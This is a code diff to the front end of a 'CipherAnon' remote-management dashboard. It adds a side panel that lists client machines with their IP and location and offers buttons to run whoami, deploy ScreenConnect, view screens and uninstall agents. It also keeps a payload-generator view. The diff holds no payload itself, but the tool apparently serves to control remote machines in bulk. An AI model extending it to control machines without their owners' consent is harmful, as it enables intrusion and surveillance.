@@ -217,7 +217,9 @@
             min-height: 100vh;
             max-width: 100%;
             overflow-x: hidden;
+            transition: margin-right 0.35s cubic-bezier(0.4, 0, 0.2, 1);
         }
+        .main.shifted { margin-right: 420px; }
 
         /* ---- TOP BAR ---- */
         .topbar {
@@ -395,86 +397,6 @@
         .filter-bar .btn-filter.primary { border-color: #00ff88; color: #00ff88; }
         .filter-bar .btn-filter.primary:hover { background: rgba(0, 255, 136, 0.08); }
 
-        /* ---- PAYLOAD GENERATOR ---- */
-        .payload-box {
-            background: rgba(255,255,255,0.02);
-            border: 1px solid rgba(255,255,255,0.04);
-            border-radius: 14px;
-            padding: 24px 28px;
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .payload-box .payload-title {
-            font-size: 18px;
-            font-weight: 700;
-            color: #f1f5f9;
-            margin-bottom: 6px;
-        }
-        .payload-box .payload-desc {
-            font-size: 13px;
-            color: #64748b;
-            margin-bottom: 20px;
-        }
-        .payload-box .payload-url {
-            background: rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 8px;
-            padding: 10px 14px;
-            font-family: 'Cascadia Code', 'Consolas', monospace;
-            font-size: 13px;
-            color: #00ff88;
-            word-break: break-all;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-bottom: 12px;
-        }
-        .payload-box .payload-url .url-text { flex: 1; min-width: 100px; word-break: break-all; }
-        .payload-box .payload-command {
-            background: rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.06);
-            border-radius: 8px;
-            padding: 10px 14px;
-            font-family: 'Cascadia Code', 'Consolas', monospace;
-            font-size: 12px;
-            color: #f1f5f9;
-            word-break: break-all;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-bottom: 16px;
-        }
-        .payload-box .payload-command .cmd-text { flex: 1; min-width: 100px; word-break: break-all; }
-        .payload-box .payload-actions {
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-        }
-        .payload-box .payload-actions .btn {
-            padding: 6px 16px;
-            border-radius: 8px;
-            border: 1px solid rgba(255,255,255,0.06);
-            background: transparent;
-            color: #94a3b8;
-            cursor: pointer;
-            font-size: 12px;
-            transition: all 0.25s ease;
-            font-weight: 500;
-            font-family: inherit;
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-        }
-        .payload-box .payload-actions .btn:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; }
-        .payload-box .payload-actions .btn.primary { border-color: #00ff88; color: #00ff88; }
-        .payload-box .payload-actions .btn.primary:hover { background: rgba(0, 255, 136, 0.08); }
-        .payload-box .payload-actions .btn.gold { border-color: #fbbf24; color: #fbbf24; }
-        .payload-box .payload-actions .btn.gold:hover { background: rgba(251, 191, 36, 0.08); }
-
         /* ---- CLIENT GRID ---- */
         .clients-grid {
             display: grid;
@@ -491,6 +413,7 @@
             transition: all 0.3s ease;
             position: relative;
             overflow: hidden;
+            cursor: pointer;
         }
         .client-card:hover {
             border-color: rgba(255,255,255,0.08);
@@ -616,48 +539,85 @@
         .client-card .card-actions .btn-sm.danger:hover { background: rgba(244, 63, 94, 0.08); }
         .client-card .card-actions .btn-sm .icon { font-size: 10px; }
 
-        /* ---- LOG PANEL ---- */
-        .log-panel {
-            background: rgba(0,0,0,0.4);
+        /* ---- PAYLOAD GENERATOR ---- */
+        .payload-box {
+            background: rgba(255,255,255,0.02);
             border: 1px solid rgba(255,255,255,0.04);
-            border-radius: 12px;
-            padding: 14px 16px;
-            margin-top: 20px;
-            max-height: 200px;
-            overflow-y: auto;
+            border-radius: 14px;
+            padding: 24px 28px;
+            max-width: 800px;
+            margin: 0 auto;
         }
-        .log-panel .log-header {
+        .payload-box .payload-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #f1f5f9;
+            margin-bottom: 6px;
+        }
+        .payload-box .payload-desc {
+            font-size: 13px;
+            color: #64748b;
+            margin-bottom: 20px;
+        }
+        .payload-box .payload-url {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 8px;
+            padding: 10px 14px;
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            font-size: 13px;
+            color: #00ff88;
+            word-break: break-all;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 8px;
-            font-size: 11px;
-            color: #64748b;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
         }
-        .log-panel .log-header .clear-log {
-            background: none;
-            border: none;
-            color: #475569;
-            cursor: pointer;
-            font-size: 11px;
-            transition: 0.2s;
-        }
-        .log-panel .log-header .clear-log:hover { color: #f43f5e; }
-        .log-panel .log-entry {
+        .payload-box .payload-url .url-text { flex: 1; min-width: 100px; word-break: break-all; }
+        .payload-box .payload-command {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 8px;
+            padding: 10px 14px;
             font-family: 'Cascadia Code', 'Consolas', monospace;
-            font-size: 11px;
-            padding: 2px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.02);
-            color: #94a3b8;
+            font-size: 12px;
+            color: #f1f5f9;
+            word-break: break-all;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
         }
-        .log-panel .log-entry .time { color: #475569; }
-        .log-panel .log-entry .type.success { color: #00ff88; }
-        .log-panel .log-entry .type.error { color: #f43f5e; }
-        .log-panel .log-entry .type.warning { color: #fbbf24; }
-        .log-panel .log-entry .type.info { color: #3b82f6; }
+        .payload-box .payload-command .cmd-text { flex: 1; min-width: 100px; word-break: break-all; }
+        .payload-box .payload-actions {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .payload-box .payload-actions .btn {
+            padding: 6px 16px;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.06);
+            background: transparent;
+            color: #94a3b8;
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.25s ease;
+            font-weight: 500;
+            font-family: inherit;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .payload-box .payload-actions .btn:hover { border-color: rgba(255,255,255,0.12); color: #e2e8f0; }
+        .payload-box .payload-actions .btn.primary { border-color: #00ff88; color: #00ff88; }
+        .payload-box .payload-actions .btn.primary:hover { background: rgba(0, 255, 136, 0.08); }
+        .payload-box .payload-actions .btn.gold { border-color: #fbbf24; color: #fbbf24; }
+        .payload-box .payload-actions .btn.gold:hover { background: rgba(251, 191, 36, 0.08); }
 
         /* ---- EMPTY STATE ---- */
         .empty-state {
@@ -800,6 +760,8 @@
         .btn.violet:hover { background: rgba(139, 92, 246, 0.08); }
         .btn.gold { border-color: #fbbf24; color: #fbbf24; }
         .btn.gold:hover { background: rgba(251, 191, 36, 0.08); }
+        .btn.blue { border-color: #3b82f6; color: #3b82f6; }
+        .btn.blue:hover { background: rgba(59, 130, 246, 0.08); }
 
         .view-content { display: none; }
         .view-content.active { display: block; }
@@ -813,6 +775,194 @@
             border-top: 1px solid rgba(255,255,255,0.04);
         }
         .powered-footer .name { color: #00ff88; font-weight: 600; }
+
+        /* ============================================================
+           SIDE PANEL — MODERN SLIDE-OUT
+           ============================================================ */
+
+        .side-panel-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            backdrop-filter: blur(4px);
+            z-index: 150;
+        }
+        .side-panel-overlay.active { display: block; }
+
+        .side-panel {
+            position: fixed;
+            top: 0;
+            right: -440px;
+            width: 420px;
+            height: 100vh;
+            background: rgba(15, 22, 38, 0.98);
+            backdrop-filter: blur(20px);
+            border-left: 1px solid rgba(255,255,255,0.04);
+            z-index: 160;
+            transition: right 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        .side-panel.open { right: 0; }
+
+        .side-panel .panel-header {
+            padding: 18px 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        .side-panel .panel-header .panel-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #f1f5f9;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .side-panel .panel-header .panel-title .status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        .side-panel .panel-header .panel-title .status-dot.online { background: #00ff88; }
+        .side-panel .panel-header .panel-title .status-dot.offline { background: #f43f5e; }
+        .side-panel .panel-header .close-panel {
+            background: none;
+            border: none;
+            color: #64748b;
+            font-size: 22px;
+            cursor: pointer;
+            transition: 0.2s;
+            padding: 4px 8px;
+            border-radius: 6px;
+        }
+        .side-panel .panel-header .close-panel:hover { color: #e2e8f0; background: rgba(255,255,255,0.04); }
+
+        .side-panel .panel-body {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px 20px 20px;
+        }
+
+        .side-panel .panel-body .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px 16px;
+            margin-bottom: 16px;
+            padding: 12px 14px;
+            background: rgba(255,255,255,0.02);
+            border-radius: 10px;
+            border: 1px solid rgba(255,255,255,0.04);
+        }
+        .side-panel .panel-body .info-grid .info-item { font-size: 12px; }
+        .side-panel .panel-body .info-grid .info-item .label { color: #64748b; font-size: 9px; text-transform: uppercase; letter-spacing: 0.4px; }
+        .side-panel .panel-body .info-grid .info-item .value { color: #e2e8f0; font-weight: 500; margin-top: 1px; }
+
+        .side-panel .panel-body .section-title {
+            font-size: 11px;
+            color: #64748b;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 600;
+            margin: 14px 0 8px 0;
+        }
+
+        .side-panel .panel-body .panel-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px;
+            margin-bottom: 12px;
+        }
+        .side-panel .panel-body .panel-actions .btn-sm {
+            padding: 4px 12px;
+            font-size: 10px;
+            border-radius: 6px;
+            border: 1px solid rgba(255,255,255,0.06);
+            background: transparent;
+            color: #94a3b8;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+            font-family: inherit;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .side-panel .panel-body .panel-actions .btn-sm:hover {
+            border-color: rgba(255,255,255,0.12);
+            color: #e2e8f0;
+        }
+        .side-panel .panel-body .panel-actions .btn-sm.primary { border-color: #00ff88; color: #00ff88; }
+        .side-panel .panel-body .panel-actions .btn-sm.primary:hover { background: rgba(0, 255, 136, 0.08); }
+        .side-panel .panel-body .panel-actions .btn-sm.gold { border-color: #fbbf24; color: #fbbf24; }
+        .side-panel .panel-body .panel-actions .btn-sm.gold:hover { background: rgba(251, 191, 36, 0.08); }
+        .side-panel .panel-body .panel-actions .btn-sm.violet { border-color: #8b5cf6; color: #8b5cf6; }
+        .side-panel .panel-body .panel-actions .btn-sm.violet:hover { background: rgba(139, 92, 246, 0.08); }
+        .side-panel .panel-body .panel-actions .btn-sm.blue { border-color: #3b82f6; color: #3b82f6; }
+        .side-panel .panel-body .panel-actions .btn-sm.blue:hover { background: rgba(59, 130, 246, 0.08); }
+        .side-panel .panel-body .panel-actions .btn-sm.danger { border-color: #f43f5e; color: #f43f5e; }
+        .side-panel .panel-body .panel-actions .btn-sm.danger:hover { background: rgba(244, 63, 94, 0.08); }
+        .side-panel .panel-body .panel-actions .btn-sm .icon { font-size: 11px; }
+
+        .side-panel .panel-body .screen-container {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 10px;
+            padding: 12px;
+            margin-top: 4px;
+            min-height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: #475569;
+            font-size: 13px;
+            position: relative;
+        }
+        .side-panel .panel-body .screen-container .screen-placeholder {
+            text-align: center;
+        }
+        .side-panel .panel-body .screen-container .screen-placeholder .icon { font-size: 32px; margin-bottom: 8px; opacity: 0.3; }
+        .side-panel .panel-body .screen-container .screen-placeholder .sub { font-size: 11px; color: #334155; }
+
+        .side-panel .panel-body .log-container {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 10px;
+            padding: 10px 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: 'Cascadia Code', 'Consolas', monospace;
+            font-size: 10px;
+        }
+        .side-panel .panel-body .log-container .log-entry {
+            padding: 2px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.02);
+            color: #94a3b8;
+        }
+        .side-panel .panel-body .log-container .log-entry .time { color: #475569; }
+        .side-panel .panel-body .log-container .log-entry .type.success { color: #00ff88; }
+        .side-panel .panel-body .log-container .log-entry .type.error { color: #f43f5e; }
+        .side-panel .panel-body .log-container .log-entry .type.warning { color: #fbbf24; }
+        .side-panel .panel-body .log-container .log-entry .type.info { color: #3b82f6; }
+
+        .side-panel .panel-body .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.1);
+            border-top-color: #00ff88;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 6px;
+            vertical-align: middle;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
         /* ---- RESPONSIVE ---- */
         @media (max-width: 768px) {
@@ -830,6 +980,7 @@
             .sidebar-overlay.active { display: block; }
             .sidebar-toggle { display: block; }
             .main { padding: 16px; padding-top: 60px; }
+            .main.shifted { margin-right: 0; }
             .topbar .left h1 { font-size: 18px; }
             .clients-grid { grid-template-columns: 1fr; }
             .stats-row { grid-template-columns: repeat(2, 1fr); }
@@ -838,7 +989,14 @@
             .filter-bar .filter-group input { min-width: 100%; }
             .modal-box { padding: 20px 16px; }
             .modal-box .btn-group { flex-direction: column; }
-            .payload-box { padding: 16px; }
+            .side-panel {
+                width: 100%;
+                right: -100%;
+            }
+            .side-panel.open { right: 0; }
+            .side-panel .panel-body .info-grid { grid-template-columns: 1fr; }
+            .side-panel .panel-body .panel-actions { flex-direction: column; }
+            .side-panel .panel-body .panel-actions .btn-sm { width: 100%; justify-content: center; }
         }
 
         @media (max-width: 480px) {
@@ -847,8 +1005,8 @@
             .topbar .right .user { font-size: 11px; }
             .client-card { padding: 14px; }
             .client-card .card-actions .btn-sm { font-size: 8px; padding: 2px 8px; }
-            .payload-box .payload-url { font-size: 11px; }
-            .payload-box .payload-command { font-size: 10px; }
+            .side-panel .panel-header .panel-title { font-size: 14px; }
+            .side-panel .panel-body .panel-actions .btn-sm { font-size: 9px; }
         }
     </style>
 </head>
@@ -891,10 +1049,6 @@
             <span class="icon">📦</span>
             Payload Generator
         </div>
-        <div class="nav-item" data-view="logs" id="navLogs">
-            <span class="icon">📋</span>
-            Command Logs
-        </div>
 
         <div class="nav-divider"></div>
 
@@ -904,6 +1058,21 @@
 
         <div class="version">
             <span>●</span> v3.0 · RMM <span>●</span>
+        </div>
+    </div>
+
+    <!-- SIDE PANEL -->
+    <div class="side-panel-overlay" id="sidePanelOverlay" onclick="closePanel()"></div>
+    <div class="side-panel" id="sidePanel">
+        <div class="panel-header">
+            <div class="panel-title">
+                <span class="status-dot" id="panelStatusDot"></span>
+                <span id="panelTitle">Client Details</span>
+            </div>
+            <button class="close-panel" onclick="closePanel()">✕</button>
+        </div>
+        <div class="panel-body" id="panelBody">
+            <!-- Populated by JavaScript -->
         </div>
     </div>
 
@@ -1014,19 +1183,6 @@
             </div>
         </div>
 
-        <!-- VIEW: COMMAND LOGS -->
-        <div class="view-content" id="viewLogs">
-            <div class="log-panel" id="logPanel">
-                <div class="log-header">
-                    <span>📋 Command Logs</span>
-                    <button class="clear-log" onclick="clearLogs()">Clear</button>
-                </div>
-                <div id="logContainer">
-                    <div class="log-entry"><span class="time">[System]</span> <span class="type info">Logs will appear here</span></div>
-                </div>
-            </div>
-        </div>
-
         <div class="powered-footer">
             Powered By <span class="name">CipherAnon</span>
         </div>
@@ -1128,7 +1284,8 @@
         let filteredClients = [];
         let confirmCallback = null;
         let currentFilter = 'all';
-        let commandLogs = [];
+        let selectedClient = null;
+        let panelLogs = [];
 
         // ============================================================
         // HELPERS
@@ -1174,31 +1331,25 @@
             el._timer = setTimeout(() => { el.className = 'toast'; }, 3000);
         }
 
-        function addLog(message, type) {
+        function addPanelLog(message, type) {
             const time = new Date().toLocaleTimeString();
-            const entry = { time, message, type: type || 'info' };
-            commandLogs.unshift(entry);
-            if (commandLogs.length > 100) commandLogs.pop();
-            renderLogs();
+            panelLogs.unshift({ time, message, type: type || 'info' });
+            if (panelLogs.length > 50) panelLogs.pop();
+            renderPanelLogs();
         }
 
-        function renderLogs() {
-            const container = document.getElementById('logContainer');
-            if (commandLogs.length === 0) {
+        function renderPanelLogs() {
+            const container = document.getElementById('panelLogContainer');
+            if (!container) return;
+            if (panelLogs.length === 0) {
                 container.innerHTML = '<div class="log-entry"><span class="time">[System]</span> <span class="type info">No logs yet</span></div>';
                 return;
             }
             let html = '';
-            commandLogs.forEach(log => {
+            panelLogs.forEach(log => {
                 html += `<div class="log-entry"><span class="time">[${log.time}]</span> <span class="type ${log.type}">${log.message}</span></div>`;
             });
             container.innerHTML = html;
-        }
-
-        function clearLogs() {
-            commandLogs = [];
-            renderLogs();
-            showToast('✅ Logs cleared', 'success');
         }
 
         // ============================================================
@@ -1338,6 +1489,10 @@
             document.getElementById('sidebarOffline').textContent = offline;
         }
 
+        // ============================================================
+        // RENDER CLIENTS
+        // ============================================================
+
         function renderRmmClients(clients) {
             const container = document.getElementById('clientsGrid');
 
@@ -1362,7 +1517,7 @@
                 const hasSc = client.screenconnectId || client.rmmType === 'ScreenConnect';
 
                 html += `
-                    <div class="client-card">
+                    <div class="client-card" onclick="openPanel('${client.clientId}')">
                         <div class="card-header">
                             <span class="status-dot ${statusDot}"></span>
                             <span class="pc-name">${client.pcName}</span>
@@ -1378,30 +1533,24 @@
                             <span class="client-id">ID: ${client.clientId}</span>
                             ${hasSc ? `<span style="color:#3b82f6;font-weight:500;">SC: ${client.screenconnectId || 'Deployed'}</span>` : ''}
                         </div>
-                        <div class="card-actions">
-                            <button class="btn-sm primary" onclick="sendCommand('${client.clientId}', 'whoami')">
-                                <span class="icon">👤</span> Whoami
+                        <div class="card-actions" onclick="event.stopPropagation();">
+                            <button class="btn-sm primary" onclick="openPanel('${client.clientId}')">
+                                <span class="icon">👁️</span> View
                             </button>
-                            <button class="btn-sm gold" onclick="sendCommand('${client.clientId}', 'hostname')">
-                                <span class="icon">💻</span> Hostname
+                            <button class="btn-sm primary" onclick="panelSendCommand('${client.clientId}', 'whoami')">
+                                <span class="icon">👤</span>
                             </button>
-                            <button class="btn-sm violet" onclick="sendCommand('${client.clientId}', 'ping')">
-                                <span class="icon">🏓</span> Ping
+                            <button class="btn-sm gold" onclick="panelSendCommand('${client.clientId}', 'hostname')">
+                                <span class="icon">💻</span>
                             </button>
-                            <button class="btn-sm primary" onclick="deployScreenConnect('${client.clientId}')">
-                                <span class="icon">📤</span> Deploy SC
+                            <button class="btn-sm violet" onclick="panelSendCommand('${client.clientId}', 'ping')">
+                                <span class="icon">🏓</span>
                             </button>
-                            ${hasSc ? `<button class="btn-sm blue" onclick="viewScreen('${client.clientId}')">
-                                <span class="icon">🖥️</span> View Screen
-                            </button>` : ''}
-                            <button class="btn-sm gold" onclick="reinstallAgent('${client.clientId}')">
-                                <span class="icon">🔄</span> Reinstall
+                            <button class="btn-sm primary" onclick="panelDeployScreenConnect('${client.clientId}')">
+                                <span class="icon">📤</span> SC
                             </button>
-                            <button class="btn-sm danger" onclick="uninstallAgent('${client.clientId}')">
-                                <span class="icon">🗑️</span> Uninstall
-                            </button>
-                            <button class="btn-sm danger" onclick="deleteClient('${client.clientId}')">
-                                <span class="icon">✕</span>
+                            <button class="btn-sm danger" onclick="panelUninstall('${client.clientId}')">
+                                <span class="icon">🗑️</span>
                             </button>
                         </div>
                     </div>
@@ -1446,11 +1595,6 @@
                     document.getElementById('pageTitle').textContent = 'Payload Generator';
                     document.getElementById('pageSub').textContent = 'Generate deployment links and commands.';
                     updatePayloadUrls();
-                } else if (view === 'logs') {
-                    document.getElementById('viewLogs').classList.add('active');
-                    document.getElementById('pageTitle').textContent = 'Command Logs';
-                    document.getElementById('pageSub').textContent = 'View all command execution history.';
-                    renderLogs();
                 }
             });
         });
@@ -1506,11 +1650,152 @@
         }
 
         // ============================================================
-        // RMM ACTIONS WITH LOGGING
+        // SIDE PANEL
         // ============================================================
 
-        async function sendCommand(clientId, command) {
-            addLog(`Sending command "${command}" to ${clientId}...`, 'info');
+        function openPanel(clientId) {
+            const client = allClients.find(c => c.clientId === clientId);
+            if (!client) {
+                showToast('❌ Client not found', 'error');
+                return;
+            }
+
+            selectedClient = client;
+            panelLogs = [];
+            document.getElementById('sidePanel').classList.add('open');
+            document.getElementById('sidePanelOverlay').classList.add('active');
+            document.getElementById('mainContent').classList.add('shifted');
+
+            renderPanel(client);
+        }
+
+        function closePanel() {
+            document.getElementById('sidePanel').classList.remove('open');
+            document.getElementById('sidePanelOverlay').classList.remove('active');
+            document.getElementById('mainContent').classList.remove('shifted');
+            selectedClient = null;
+        }
+
+        function renderPanel(client) {
+            const container = document.getElementById('panelBody');
+            const flag = getFlagEmoji(client.countryCode);
+            const statusDot = client.status === 'online' ? 'online' : 'offline';
+            const statusText = client.status === 'online' ? 'Online' : 'Offline';
+            const hasSc = client.screenconnectId || client.rmmType === 'ScreenConnect';
+
+            document.getElementById('panelStatusDot').className = 'status-dot ' + statusDot;
+            document.getElementById('panelTitle').textContent = client.pcName;
+
+            container.innerHTML = `
+                <div class="info-grid">
+                    <div class="info-item">
+                        <div class="label">Hostname</div>
+                        <div class="value">${client.pcName}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">Status</div>
+                        <div class="value" style="color:${client.status === 'online' ? '#00ff88' : '#f43f5e'};">${statusText}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">IP Address</div>
+                        <div class="value">${client.ip || 'N/A'}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">Location</div>
+                        <div class="value">${flag} ${client.country || 'Unknown'}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">OS</div>
+                        <div class="value">${client.os || 'Unknown'}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">Client ID</div>
+                        <div class="value" style="font-family:monospace;font-size:11px;">${client.clientId}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">RMM Type</div>
+                        <div class="value">${client.rmmType || 'CipherAnon'}</div>
+                    </div>
+                    <div class="info-item">
+                        <div class="label">ScreenConnect</div>
+                        <div class="value" style="color:${hasSc ? '#3b82f6' : '#64748b'};">${hasSc ? (client.screenconnectId || 'Deployed') : 'Not Deployed'}</div>
+                    </div>
+                    <div class="info-item" style="grid-column:1/-1;">
+                        <div class="label">Last Seen</div>
+                        <div class="value">${timeAgo(client.lastSeen)} (${new Date(client.lastSeen).toLocaleString()})</div>
+                    </div>
+                </div>
+
+                <div class="section-title">🎯 Quick Actions</div>
+                <div class="panel-actions">
+                    <button class="btn-sm primary" onclick="panelSendCommand('${client.clientId}', 'whoami')">
+                        <span class="icon">👤</span> Whoami
+                    </button>
+                    <button class="btn-sm gold" onclick="panelSendCommand('${client.clientId}', 'hostname')">
+                        <span class="icon">💻</span> Hostname
+                    </button>
+                    <button class="btn-sm violet" onclick="panelSendCommand('${client.clientId}', 'ping')">
+                        <span class="icon">🏓</span> Ping
+                    </button>
+                    <button class="btn-sm primary" onclick="panelDeployScreenConnect('${client.clientId}')">
+                        <span class="icon">📤</span> Deploy ScreenConnect
+                    </button>
+                    ${hasSc ? `<button class="btn-sm blue" onclick="panelViewScreen('${client.clientId}')">
+                        <span class="icon">🖥️</span> View Screen
+                    </button>` : ''}
+                    <button class="btn-sm gold" onclick="panelReinstall('${client.clientId}')">
+                        <span class="icon">🔄</span> Reinstall
+                    </button>
+                    <button class="btn-sm danger" onclick="panelUninstall('${client.clientId}')">
+                        <span class="icon">🗑️</span> Uninstall
+                    </button>
+                    <button class="btn-sm danger" onclick="panelDelete('${client.clientId}')">
+                        <span class="icon">✕</span> Delete
+                    </button>
+                </div>
+
+                <div class="section-title">🖥️ Remote Screen</div>
+                <div class="screen-container" id="panelScreenContainer">
+                    ${hasSc ? `
+                        <div style="text-align:center;color:#3b82f6;">
+                            <div style="font-size:28px;margin-bottom:4px;">🖥️</div>
+                            <div>ScreenConnect ID: ${client.screenconnectId}</div>
+                            <button class="btn blue" onclick="panelViewScreen('${client.clientId}')" style="margin-top:8px;padding:4px 16px;font-size:11px;">
+                                🖥️ Open Viewer
+                            </button>
+                        </div>
+                    ` : `
+                        <div class="screen-placeholder">
+                            <div class="icon">🖥️</div>
+                            <div>No ScreenConnect deployed</div>
+                            <div class="sub">Deploy ScreenConnect to view this machine</div>
+                        </div>
+                    `}
+                </div>
+
+                <div class="section-title">📋 Command Log</div>
+                <div class="log-container" id="panelLogContainer">
+                    <div class="log-entry"><span class="time">[System]</span> <span class="type info">Ready</span></div>
+                </div>
+            `;
+
+            renderPanelLogs();
+        }
+
+        // ============================================================
+        // PANEL ACTIONS
+        // ============================================================
+
+        async function panelSendCommand(clientId, command) {
+            if (!selectedClient || selectedClient.clientId !== clientId) {
+                const client = allClients.find(c => c.clientId === clientId);
+                if (client) {
+                    selectedClient = client;
+                    renderPanel(client);
+                }
+            }
+            addPanelLog(`▶️ Sending "${command}"...`, 'info');
+
             try {
                 const res = await fetch(`/api/rmm/command/${clientId}`, {
                     method: 'POST',
@@ -1519,22 +1804,41 @@
                 });
                 const data = await res.json();
                 if (data.status === 'ok') {
-                    addLog(`✅ Command "${command}" sent successfully`, 'success');
+                    addPanelLog(`✅ "${command}" sent successfully`, 'success');
                     showToast(`✅ Command sent: ${command}`, 'success');
                     setTimeout(() => fetchRmmClients(), 2000);
                 } else {
-                    addLog(`❌ Failed to send "${command}": ${data.message}`, 'error');
+                    addPanelLog(`❌ Failed: ${data.message}`, 'error');
                     showToast(`❌ Failed: ${data.message}`, 'error');
                 }
             } catch (e) {
-                addLog(`❌ Error sending "${command}": ${e.message}`, 'error');
+                addPanelLog(`❌ Error: ${e.message}`, 'error');
                 showToast('❌ Error sending command', 'error');
             }
         }
 
-        async function deployScreenConnect(clientId) {
-            if (!confirm('📤 Deploy ScreenConnect to this client?')) return;
-            addLog(`Deploying ScreenConnect to ${clientId}...`, 'info');
+        async function panelDeployScreenConnect(clientId) {
+            if (!selectedClient || selectedClient.clientId !== clientId) {
+                const client = allClients.find(c => c.clientId === clientId);
+                if (client) {
+                    selectedClient = client;
+                    renderPanel(client);
+                }
+            }
+
+            addPanelLog('📤 Deploying ScreenConnect...', 'info');
+
+            // Show loading state in screen container
+            const screenContainer = document.getElementById('panelScreenContainer');
+            if (screenContainer) {
+                screenContainer.innerHTML = `
+                    <div style="text-align:center;">
+                        <div class="loading-spinner"></div>
+                        <div style="color:#00ff88;margin-top:6px;">Deploying ScreenConnect...</div>
+                        <div style="color:#475569;font-size:11px;margin-top:2px;">Please wait</div>
+                    </div>
+                `;
+            }
 
             try {
                 const res = await fetch(`/api/rmm/move/${clientId}`, {
@@ -1543,43 +1847,54 @@
                     body: JSON.stringify({ targetRmm: 'screenconnect' })
                 });
                 const data = await res.json();
+
                 if (data.status === 'ok') {
-                    addLog(`✅ ScreenConnect deployed to ${clientId}`, 'success');
-                    showToast(`✅ ${data.message}`, 'success');
-                    setTimeout(() => fetchRmmClients(), 3000);
+                    addPanelLog('✅ ScreenConnect deployed successfully', 'success');
+                    showToast('✅ ScreenConnect deployed', 'success');
+                    setTimeout(() => {
+                        fetchRmmClients();
+                        // Re-render panel after fetch
+                        const updatedClient = allClients.find(c => c.clientId === clientId);
+                        if (updatedClient) {
+                            selectedClient = updatedClient;
+                            renderPanel(updatedClient);
+                        }
+                    }, 3000);
                 } else {
-                    addLog(`❌ ScreenConnect deployment failed: ${data.message}`, 'error');
+                    addPanelLog(`❌ Failed: ${data.message}`, 'error');
                     showToast(`❌ Failed: ${data.message}`, 'error');
+                    // Re-render to show error
+                    renderPanel(selectedClient);
                 }
             } catch (e) {
-                addLog(`❌ Error deploying ScreenConnect: ${e.message}`, 'error');
+                addPanelLog(`❌ Error: ${e.message}`, 'error');
                 showToast('❌ Error deploying', 'error');
+                renderPanel(selectedClient);
             }
         }
 
-        function viewScreen(clientId) {
+        function panelViewScreen(clientId) {
             const client = allClients.find(c => c.clientId === clientId);
             if (!client || !client.screenconnectId) {
-                showToast('❌ No ScreenConnect ID found for this client', 'error');
+                showToast('❌ No ScreenConnect ID found', 'error');
+                addPanelLog('❌ No ScreenConnect ID found', 'error');
                 return;
             }
-            // Open ScreenConnect viewer (you need to configure your SC URL)
-            const scUrl = prompt('Enter your ScreenConnect viewer URL (e.g., https://your-sc.com/Viewer/', 'https://your-screenconnect.com/Viewer/');
+
+            const scUrl = prompt('Enter your ScreenConnect viewer URL:', 'https://your-screenconnect.com/Viewer/');
             if (scUrl) {
                 window.open(scUrl + client.screenconnectId, '_blank');
-                addLog(`🖥️ Opened ScreenConnect viewer for ${client.pcName} (${client.screenconnectId})`, 'info');
-                showToast('🖥️ ScreenConnect viewer opened', 'success');
+                addPanelLog(`🖥️ Opened ScreenConnect viewer for ${client.pcName} (${client.screenconnectId})`, 'info');
+                showToast('🖥️ Viewer opened', 'success');
             }
         }
 
-        async function reinstallAgent(clientId) {
